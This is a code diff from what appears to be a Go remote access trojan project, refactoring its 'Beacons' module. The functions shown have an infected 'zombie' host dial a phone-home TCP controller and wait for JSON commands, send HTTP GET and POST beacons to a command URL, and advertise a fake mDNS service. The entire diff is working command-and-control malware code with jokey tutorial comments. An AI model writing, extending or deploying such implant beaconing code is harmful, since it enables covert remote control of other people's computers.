@@ -2,12 +2,16 @@
 This file contains the code for "beacons"
 
 /*/
-package shared_code
+package Beacons
 
 import (
 	"bufio"
+	"bytes"
 	"encoding/json"
 	"fmt"
+	"go_rat/pkg/shared_code/Core"
+	"go_rat/pkg/shared_code/Crypto"
+	"go_rat/pkg/shared_code/ErrorHandling"
 	"net"
 	"net/http"
 	"os"
@@ -23,13 +27,20 @@ import (
 // if a "good password *HINT*" is provided
 // put the id of the entity connecting to let the host know it's us
 func BaconTCP(zombie_ID string) {
-	PHONEHOME_TCP.IP = net.IP(Remote_tcpaddr)
-	connection, derp := net.DialTCP("tcp", &Local_tcpaddr_LAN, &PHONEHOME_TCP)
+	// Have to cast the string to a net.IP type
+	Core.PHONEHOME_TCP.IP = net.IP(Core.Remote_tcpaddr)
+	// the network functions return two objects
+	// a connection
+	// and an error
+	connection, derp := net.DialTCP("tcp", &Core.Local_tcpaddr_LAN, &Core.PHONEHOME_TCP)
 	if derp != nil {
 		// print the error
-		Error_printer(derp, "[-] Error: TCP Beacon handshake Failed")
+		ErrorHandling.Error_printer(derp, "[-] Error: TCP Beacon handshake Failed")
 		return
 	}
+	// if there was no error, continue to the control loop
+	// we Assume all communication from the controller to be in json only
+	// we are only sending encoded json so we should only react to encoded json
 	// now we just wait...
 	/// zombie should be dialing the home base expecting commands on connect
 	// assuming we coded the command and control to reply on connect and not just
@@ -41,9 +52,22 @@ func BaconTCP(zombie_ID string) {
 		netData, derp := bufio.NewReader(connection).ReadString('\n')
 		if derp != nil {
 			// print the error
-			Error_printer(derp, "[-] Error: TCP Beacon Connection Failed")
+			ErrorHandling.Error_printer(derp, "[-] Error: TCP Beacon Connection Failed")
 			return
 		}
+		json_from_command, derp := json.Marshal(netData)
+		if derp != nil {
+			// print the error
+			ErrorHandling.Error_printer(derp, "[-] Error: TCP Beacon Connection Failed")
+			return
+		}
+		beacon_reply := Core.BeaconResponse{
+			Authstring: string(json_from_command),
+		}
+		// we authenticate the reply
+		Crypto.Hash_auth_check(beacon_reply.Authstring)
+		// now we hand off to connection_manager
+		// IF the command center authed properly
 	}
 }
 
@@ -55,38 +79,35 @@ func BeaconUDP() {
 // even though we are using POST, its not going to carry much data,
 // and will only be used as a beacon. the handshake is a specific
 // function that needs its own code and placement
-func BeaconHTTP(command_url string, request_type string) (*http.Response, error) {
-	// if its a get request
-	switch request_type {
-	case "get":
-		http_response, derp := http.Get(command_url)
-		if derp != nil {
-			Error_printer(derp, "[-] Beacon GET failed to connect to command, stopping beacon")
-			return http_response, derp
-		}
-		return http_response, derp
-	case "post":
-		//  POST requests are pushing data to the server
-		// they POST data to a source, instead of GETting it!
-		// GET it?
-		post_body, derp := json.Marshal(BEACONPOSTPAYLOAD)
-		if derp != nil {
-			Error_printer(derp, "[-] Beacon POST payload failed to marshal, stopping beacon")
-		}
-		// but this function we are using takes bytes!
-		// so you need a line of code like THIS!!
-		// to turn text to bytes!
-		// post_body_bytes := bytes.NewBuffer(post_body)
-		http_response, derp := http.Post(command_url, "text/html", post_body_bytes)
-		if derp != nil {
-			Error_printer(derp, "[-] Beacon POST failed to connect to command, stopping beacon")
-			return http_response, derp
 
-		}
+func BeaconHTTPGet(command_url string) (*http.Response, error) {
+	http_response, derp := http.Get(command_url)
+	if derp != nil {
+		ErrorHandling.Error_printer(derp, "[-] Beacon GET failed to connect to command, stopping beacon")
 		return http_response, derp
 	}
 	return http_response, derp
+}
 
+func BeaconHTTPPost(command_url string) (*http.Response, error) {
+	//  POST requests are pushing data to the server
+	// they POST data to a source, instead of GETting it!
+	// GET it?
+	post_body, derp := json.Marshal(Core.BEACONPOSTPAYLOAD)
+	if derp != nil {
+		ErrorHandling.Error_printer(derp, "[-] Beacon POST payload failed to marshal, stopping beacon")
+	}
+	// but this function we are using takes bytes!
+	// so you need a line of code like THIS!!
+	// to turn text to bytes!
+	// Comment this for tutorial
+	post_body_bytes := bytes.NewBuffer(post_body)
+	http_response, derp := http.Post(command_url, "text/html", post_body_bytes)
+	if derp != nil {
+		ErrorHandling.Error_printer(derp, "[-] Beacon POST failed to connect to command, stopping beacon")
+		return http_response, derp
+	}
+	return http_response, derp
 }
 
 /*/
@@ -121,13 +142,13 @@ func MdnsResponder() {
 	close(entriesCh)
 }
 
-func StartMdnsReceiver(service_name string, false_service_struct FakeMDNSService) {
+func StartMdnsReceiver(service_name string, false_service_struct Core.FakeMDNSService) {
 	// Setup our service export
 	host, _ := os.Hostname()
 	info := []string{service_name}
 	service, _ := mdns.NewMDNSService(host, "_foobar._tcp", "", "", 8000, nil, info)
 	// assign to struct
-	fake_mdns_service := FakeMDNSService{}
+	fake_mdns_service := Core.FakeMDNSService{}
 	fake_mdns_service.host = host
 	fake_mdns_service.info = info[0]
 	fake_mdns_service.service = *service
